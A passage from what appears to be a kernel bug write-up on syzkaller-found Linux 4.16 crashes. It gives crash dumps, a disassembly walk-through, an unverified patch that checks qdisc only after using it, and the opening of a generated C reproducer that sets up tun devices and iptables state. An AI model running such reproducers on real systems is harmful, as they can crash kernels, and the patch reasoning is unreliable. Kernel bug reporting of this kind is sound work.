#17\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\nRIP: 0010:qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline]\nRIP: 0010:pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638\nRSP: 0018:ffffb1ffc13df8e8 EFLAGS: 00010207\nRAX: 0000472b4040eaa4 RBX: 0000000000000000 RCX: ffffffff8af3a141\nRDX: 0000000000000000 RSI: 0000000000000005 RDI: ffff8ad479d17b08\nRBP: ffff8ad479d178c0 R08: 0000000000000000 R09: 0000000000000000\nR10: ffffb1ffc13df868 R11: 5aaeccbc2ff5acd1 R12: ffff8ad479d17800\nR13: ffff8ad43a9f7f00 R14: ffff8ad479d17b08 R15: ffffb1ffc13df958\nFS:  00007ff075d99700(0000) GS:ffff8ad43fc00000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: ffff8ad43a9f7f28 CR3: 000000007a882000 CR4: 00000000000006f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n __dev_xmit_skb net/core/dev.c:3209 [inline]\n __dev_queue_xmit+0x331/0xd80 net/core/dev.c:3510\n neigh_hh_output include/net/neighbour.h:472 [inline]\n neigh_output include/net/neighbour.h:480 [inline]\n ip_finish_output2+0x5d8/0x7d0 net/ipv4/ip_output.c:229\n ip_finish_output+0x246/0x3d0 net/ipv4/ip_output.c:317\n NF_HOOK_COND include/linux/netfilter.h:277 [inline]\n ip_output+0x8a/0x2e0 net/ipv4/ip_output.c:405\n dst_output include/net/dst.h:443 [inline]\n ip_local_out+0x4e/0xa0 net/ipv4/ip_output.c:124\n ip_queue_xmit+0x289/0x760 net/ipv4/ip_output.c:504\n tcp_transmit_skb+0x645/0xd60 net/ipv4/tcp_output.c:1176\n tcp_send_ack.part.42+0xd4/0x160 net/ipv4/tcp_output.c:3619\n tcp_send_ack+0x1e/0x30 net/ipv4/tcp_output.c:3589\n tcp_cleanup_rbuf+0x88/0x180 net/ipv4/tcp.c:1605\n tcp_recvmsg+0x45c/0xf00 net/ipv4/tcp.c:2022\n inet_recvmsg+0x78/0x270 net/ipv4/af_inet.c:796\n sock_recvmsg_nosec net/socket.c:803 [inline]\n sock_recvmsg+0x47/0x60 net/socket.c:810\n sock_read_iter+0xb2/0x120 net/socket.c:887\n call_read_iter include/linux/fs.h:1775 [inline]\n new_sync_read fs/read_write.c:401 [inline]\n __vfs_read+0x169/0x1d0 fs/read_write.c:413\n vfs_read+0xc0/0x1a0 fs/read_write.c:447\n SYSC_read fs/read_write.c:573 [inline]\n SyS_read+0x60/0xe0 fs/read_write.c:566\n do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\n entry_SYSCALL_64_after_hwframe+0x26/0x9b\nRIP: 0033:0x488864\nRSP: 002b:000000c4204a99a8 EFLAGS: 00000246 ORIG_RAX: 0000000000000000\nRAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000488864\nRDX: 0000000000001000 RSI: 000000c4203c1000 RDI: 0000000000000003\nRBP: 000000c4204a99f8 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000246 R12: 000000c425859aa0\nR13: 0000000000000001 R14: 000000c42449b260 R15: 0000000000000000\nCode: 00 00 39 83 40 02 00 00 7d 67 e8 7e 48 63 ff 4c 89 f7 e8 46 2f 37 00 31 db e8 6f 48 63 ff 49 8b 44 24 58 65 ff 00 49 8b 44 24 58 <41> 8b 55 28 65 01 50 04 e8 55 48 63 ff 89 d8 5b 5d 41 5c 41 5d \nRIP: qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline] RSP: ffffb1ffc13df8e8\nRIP: pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638 RSP: ffffb1ffc13df8e8\nCR2: ffff8ad43a9f7f28\n---[ end trace a3bf459ad1c9376d ]---\n```\n\nRIP is pointing at pfifo_fast_enqueue.\n\n### Bug\n\n```c\nstatic int pfifo_fast_enqueue(struct sk_buff *skb, struct Qdisc *qdisc,\n\t\t\t      struct sk_buff **to_free)\n{\n\tint band = prio2band[skb->priority & TC_PRIO_MAX];\n\tstruct pfifo_fast_priv *priv = qdisc_priv(qdisc);\n\tstruct skb_array *q = band2list(priv, band);\n\tint err;\n\n\terr = skb_array_produce(q, skb);\n\n\tif (unlikely(err))\n\t\treturn qdisc_drop_cpu(skb, qdisc, to_free);\n\n\tqdisc_qstats_cpu_qlen_inc(qdisc);\n\tqdisc_qstats_cpu_backlog_inc(qdisc, skb);\n\treturn NET_XMIT_SUCCESS;\n}\n\nstatic inline void qdisc_qstats_cpu_qlen_inc(struct Qdisc *sch)\n{\n\tthis_cpu_inc(sch->cpu_qstats->qlen); // equals to this_cpu_add(sch->cpu_qstats->qlen, 1);\n}\n\nstatic inline void qdisc_qstats_cpu_backlog_inc(struct Qdisc *sch,\n\t\t\t\t\t\tconst struct sk_buff *skb)\n{\n\tthis_cpu_add(sch->cpu_qstats->backlog, qdisc_pkt_len(skb));\n}\n\n```\n\n```c\n   0:   00 00                   add    BYTE PTR [rax],al\n   2:   39 83 40 02 00 00       cmp    DWORD PTR [rbx+0x240],eax ; unlikely(err)\n   8:   7d 67                   jge    0x71 ; maybe errout\n   a:   e8 7e 48 63 ff          call   0xffffffffff63488d ; this_cpu_add\n   f:   4c 89 f7                mov    rdi,r14\n  12:   e8 46 2f 37 00          call   0x372f5d\n  17:   31 db                   xor    ebx,ebx ; ebx = 0\n  19:   e8 6f 48 63 ff          call   0xffffffffff63488d ; this_cpu_add\n  1e:   49 8b 44 24 58          mov    rax,QWORD PTR [r12+0x58]\n  23:   65 ff 00                inc    DWORD PTR gs:[rax] ; sch->cpu_qstats->qlen, increased by 1\n  26:   49 8b 44 24 58          mov    rax,QWORD PTR [r12+0x58] ; qdisc\n  2b:  *41 8b 55 28             mov    edx,DWORD PTR [r13+0x28] ; skb\n  2f:   65 01 50 04             add    DWORD PTR gs:[rax+0x4],edx\n  33:   e8 55 48 63 ff          call   0xffffffffff63488d ; this_cpu_add\n  38:   89 d8                   mov    eax,ebx ; eax = ebx (eax = 0)\n  3a:   5b                      pop    rbx\n  3b:   5d                      pop    rbp\n  3c:   41 5c                   pop    r12\n  3e:   41 5d                   pop    r13\n```\n\nGenerously, 'Unable to handle kernel paging request' bug happened when bad type-casting or invalid pointer exist.\n\nAt 0x2b, there is a crash point. Meaning that accessing [r13+0x28] is violated.  Let's have a look.\n\nWith above Crash Dump, we can notice **r13** is 0x1. At result, in that case, accessing at 0x29 where a invalid page is currently, getting value from there and moving into edx (skb).\n\nSo the bug is happened by above reason.\n\nThen, why 'r13' is corrupted? Well... digging up more with reproducible PoC and then maybe there's a clear result :).\n\n### Solution\n\nMaybe, more strict pointer validation is needed at qdisc & skb. Here's my suggested patch PoC code. (not verified).\n\n```c\nstatic int pfifo_fast_enqueue(struct sk_buff *skb, struct Qdisc *qdisc,\n\t\t\t      struct sk_buff **to_free)\n{\n\tint band = prio2band[skb->priority & TC_PRIO_MAX];\n\tstruct pfifo_fast_priv *priv = qdisc_priv(qdisc);\n\tstruct skb_array *q = band2list(priv, band);\n\tint err;\n\n\terr = skb_array_produce(q, skb);\n\n\tif (unlikely(err))\n\t\treturn qdisc_drop_cpu(skb, qdisc, to_free);\n\t\t\n\tif (!qdisc) // qdisc validation\n\t    return sth;\n\t\n\tqdisc_qstats_cpu_qlen_inc(qdisc);\n\tqdisc_qstats_cpu_backlog_inc(qdisc, skb);\n\treturn NET_XMIT_SUCCESS;\n}\n```\n\n## tick_sched_time/handle - alloca Out Of Bounds\n\nGot from syzkaller & Found in LK v4.16.0-rc2~.\n\n### Call Trace (Dump)\n\n```c\nBUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180\nRead of size 8 at addr ffff880022ba7030 by task syz-executor5/3160\n\nCPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n print_address_description+0x60/0x22b\n kasan_report.cold.6+0xac/0x2f4\n </IRQ>\n\nThe buggy address belongs to the page:\npage:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0\nflags: 0x100000000000000()\nraw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\nraw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca\n>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00\n                                     ^\n ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1\n ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2\n==================================================================\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n panic+0x1f8/0x46f\n kasan_end_report+0x43/0x49\n kasan_report.cold.6+0xc8/0x2f4\n </IRQ>\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n2018/02/24 05:33:21 reproducing crash 'KASAN: alloca-out-of-bounds Read in tick_sched_handle': final repro crashed as (corrupted=false):\n==================================================================\nBUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180\nRead of size 8 at addr ffff880022ba7030 by task syz-executor5/3160\n\nCPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n print_address_description+0x60/0x22b\n kasan_report.cold.6+0xac/0x2f4\n </IRQ>\n\nThe buggy address belongs to the page:\npage:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0\nflags: 0x100000000000000()\nraw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\nraw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca\n>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00\n                                     ^\n ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1\n ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2\n==================================================================\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n panic+0x1f8/0x46f\n kasan_end_report+0x43/0x49\n kasan_report.cold.6+0xc8/0x2f4\n </IRQ>\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\n### PoC\n\ngenerated by syz-repro.\n\n```c\n#define _GNU_SOURCE\n\n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <errno.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/prctl.h>\n#include <dirent.h>\n#include <sys/mount.h>\n#include <arpa/inet.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <linux/if.h>\n#include <linux/if_ether.h>\n#include <linux/if_tun.h>\n#include <linux/ip.h>\n#include <linux/tcp.h>\n#include <net/if_arp.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/uio.h>\n#include <linux/net.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\n  static void fail(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\n}\n\n  static void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic uint64_t current_time_ms()\n{\n\tstruct timespec ts;\n\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\n\t\tfail(\"clock_gettime failed\");\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\n}\n\nstatic void use_temporary_dir()\n{\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\n\tchar* tmpdir = mkdtemp(tmpdir_template);\n\tif (!tmpdir)\n\t\tfail(\"failed to mkdtemp\");\n\tif (chmod(tmpdir, 0777))\n\t\tfail(\"failed to chmod\");\n\tif (chdir(tmpdir))\n\t\tfail(\"failed to chdir\");\n}\n\nstatic void vsnprintf_check(char* str, size_t size, const char* format, va_list args)\n{\n\tint rv;\n\n\trv = vsnprintf(str, size, format, args);\n\tif (rv < 0)\n\t\tfail(\"tun: snprintf failed\");\n\tif ((size_t)rv >= size)\n\t\tfail(\"tun: string '%s...' doesn't fit into buffer\", str);\n}\n\nstatic void snprintf_check(char* str, size_t size, const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvsnprintf_check(str, size, format, args);\n\tva_end(args);\n}\n\n#define COMMAND_MAX_LEN 128\n#define PATH_PREFIX \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \"\n#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)\n\nstatic void execute_command(bool panic, const char* format, ...)\n{\n\tva_list args;\n\tchar command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];\n\tint rv;\n\n\tva_start(args, format);\n\tmemcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);\n\tvsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);\n\trv = system(command);\n\tif (panic && rv != 0)\n\t\tfail(\"tun: command \\\"%s\\\" failed with code %d\", &command[0], rv);\n\n\tva_end(args);\n}\n\nstatic int tunfd = -1;\nstatic int tun_frags_enabled;\n\n#define SYZ_TUN_MAX_PACKET_SIZE 1000\n\n#define TUN_IFACE \"syz_tun\"\n\n#define LOCAL_MAC \"aa:aa:aa:aa:aa:aa\"\n#define REMOTE_MAC \"aa:aa:aa:aa:aa:bb\"\n\n#define LOCAL_IPV4 \"172.20.20.170\"\n#define REMOTE_IPV4 \"172.20.20.187\"\n\n#define LOCAL_IPV6 \"fe80::aa\"\n#define REMOTE_IPV6 \"fe80::bb\"\n\n#define IFF_NAPI 0x0010\n#define IFF_NAPI_FRAGS 0x0020\n\nstatic void initialize_tun(void)\n{\n\ttunfd = open(\"/dev/net/tun\", O_RDWR | O_NONBLOCK);\n\tif (tunfd == -1) {\n\t\tprintf(\"tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\\n\");\n\t\tprintf(\"otherwise fuzzing or reproducing might not work as intended\\n\");\n\t\treturn;\n\t}\n\tconst int kTunFd = 252;\n\tif (dup2(tunfd, kTunFd) < 0)\n\t\tfail(\"dup2(tunfd, kTunFd) failed\");\n\tclose(tunfd);\n\ttunfd = kTunFd;\n\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);\n\tifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;\n\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {\n\t\tifr.ifr_flags = IFF_TAP | IFF_NO_PI;\n\t\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)\n\t\t\tfail(\"tun: ioctl(TUNSETIFF) failed\");\n\t}\n\tif (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)\n\t\tfail(\"tun: ioctl(TUNGETIFF) failed\");\n\ttun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.accept_dad=0\", TUN_IFACE);\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.router_solicitations=0\", TUN_IFACE);\n\n\texecute_command(1, \"ip link set dev %s address %s\", TUN_IFACE, LOCAL_MAC);\n\texecute_command(1, \"ip addr add %s/24 dev %s\", LOCAL_IPV4, TUN_IFACE);\n\texecute_command(1, \"ip -6 addr add %s/120 dev %s\", LOCAL_IPV6, TUN_IFACE);\n\texecute_command(1, \"ip neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV4, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip -6 neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV6, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip link set dev %s up\", TUN_IFACE);\n}\n\n#define DEV_IPV4 \"172.20.20.%d\"\n#define DEV_IPV6 \"fe80::%02hx\"\n#define DEV_MAC \"aa:aa:aa:aa:aa:%02hx\"\n\nstatic void initialize_netdevices(void)\n{\n\tunsigned i;\n\tconst char* devtypes[] = {\"ip6gretap\", \"bridge\", \"vcan\", \"bond\", \"veth\"};\n\tconst char* devnames[] = {\"lo\", \"sit0\", \"bridge0\", \"vcan0\", \"tunl0\",\n\t\t\t\t  \"gre0\", \"gretap0\", \"ip_vti0\", \"ip6_vti0\",\n\t\t\t\t  \"ip6tnl0\", \"ip6gre0\", \"ip6gretap0\",\n\t\t\t\t  \"erspan0\", \"bond0\", \"veth0\", \"veth1\"};\n\n\tfor (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)\n\t\texecute_command(0, \"ip link add dev %s0 type %s\", devtypes[i], devtypes[i]);\n\texecute_command(0, \"ip link add dev veth1 type veth\");\n\tfor (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {\n\t\tchar addr[32];\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);\n\t\texecute_command(0, \"ip -4 addr add %s/24 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);\n\t\texecute_command(0, \"ip -6 addr add %s/120 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);\n\t\texecute_command(0, \"ip link set dev %s address %s\", devnames[i], addr);\n\t\texecute_command(0, \"ip link set dev %s up\", devnames[i]);\n\t}\n}\n\nstatic int read_tun(char* data, int size)\n{\n\tif (tunfd < 0)\n\t\treturn -1;\n\n\tint rv = read(tunfd, data, size);\n\tif (rv < 0) {\n\t\tif (errno == EAGAIN)\n\t\t\treturn -1;\n\t\tif (errno == EBADFD)\n\t\t\treturn -1;\n\t\tfail(\"tun: read failed with %d\", rv);\n\t}\n\treturn rv;\n}\n\nstatic void flush_tun()\n{\n\tchar data[SYZ_TUN_MAX_PACKET_SIZE];\n\twhile (read_tun(&data[0], sizeof(data)) != -1)\n\t\t;\n}\n\nstatic uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)\n{\n\tint ptyno = 0;\n\tif (ioctl(a0, TIOCGPTN, &ptyno))\n\t\treturn -1;\n\tchar buf[128];\n\tsprintf(buf, \"/dev/pts/%d\", ptyno);\n\treturn open(buf, a1, 0);\n}\n\n#define XT_TABLE_SIZE 1536\n#define XT_MAX_ENTRIES 10\n\nstruct xt_counters {\n\tuint64_t pcnt, bcnt;\n};\n\nstruct ipt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct ipt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct ipt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct ipt_table_desc {\n\tconst char* name;\n\tstruct ipt_getinfo info;\n\tstruct ipt_replace replace;\n};\n\nstatic struct ipt_table_desc ipv4_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\nstatic struct ipt_table_desc ipv6_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\n#define IPT_BASE_CTL 64\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\n\nstruct arpt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct arpt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct arpt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct arpt_table_desc {\n\tconst char* name;\n\tstruct arpt_getinfo info;\n\tstruct arpt_replace replace;\n};\n\nstatic struct arpt_table_desc arpt_tables[] = {\n    {.name = \"filter\"},\n};\n\n#define ARPT_BASE_CTL 96\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\n\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct ipt_get_entries entries;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct ipt_get_entries entries;\n\tstruct ipt_getinfo info;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_arptables(void)\n{\n\tstruct arpt_get_entries entries;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_arptables()\n{\n\tstruct xt_counters 